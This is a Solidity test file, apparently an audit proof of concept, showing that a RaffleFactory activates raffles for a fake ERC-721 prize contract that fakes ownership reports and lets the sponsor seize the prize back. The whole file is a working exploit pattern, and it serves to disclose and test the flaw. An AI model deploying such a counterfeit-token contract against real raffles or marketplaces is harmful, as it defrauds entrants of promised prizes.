// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { RaffleFactory } from "../../src/RaffleFactory.sol";
import { IRaffle } from "../../src/interfaces/IRaffle.sol";
import { IRaffleFactory } from "../../src/interfaces/IRaffleFactory.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SixDecimalToken {
    function decimals() external pure returns (uint8) {
        return 6;
    }
}

contract DummyWrapper {
    function link() external pure returns (address) {
        return address(1);
    }
}

/// @dev This contract claims ERC-721 support and fabricates owner reports without moving a token.
contract UntrustedPrize {
    mapping(uint256 => address) public actualOwner;
    mapping(uint256 => address) public reportedOwner;

    constructor(address sponsor) {
        actualOwner[1] = sponsor;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC721).interfaceId;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        reportedOwner[tokenId] = to;
        IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "");
        // Deliberately do not change actualOwner[tokenId].
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        return reportedOwner[tokenId];
    }

    function seize(uint256 tokenId, address nextReportedOwner) external {
        reportedOwner[tokenId] = nextReportedOwner;
    }
}

contract UntrustedPrizeProof {
    function testFactoryActivatesWithoutPrizeOwnershipMutation() external {
        SixDecimalToken quote = new SixDecimalToken();
        DummyWrapper wrapper = new DummyWrapper();
        RaffleFactory factory = new RaffleFactory(address(quote), address(wrapper), address(0xBEEF));
        UntrustedPrize prize = new UntrustedPrize(address(this));

        address raffle = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                sponsorRecipient: address(0xCAFE),
                prizeToken: address(prize),
                prizeTokenId: 1,
                reserveEntries: 1,
                endTime: uint64(block.timestamp + 1 hours)
            })
        );

        require(factory.isRaffle(raffle), "clone is not registered");
        require(IRaffle(raffle).status() == IRaffle.Status.Active, "raffle is not active");
        require(prize.actualOwner(1) == address(this), "the fake token changed its real ledger");
        require(prize.ownerOf(1) == raffle, "the fake token did not pass ownerOf check");

        prize.seize(1, address(this));
        require(prize.ownerOf(1) == address(this), "the sponsor cannot rewrite ownership");
    }
}
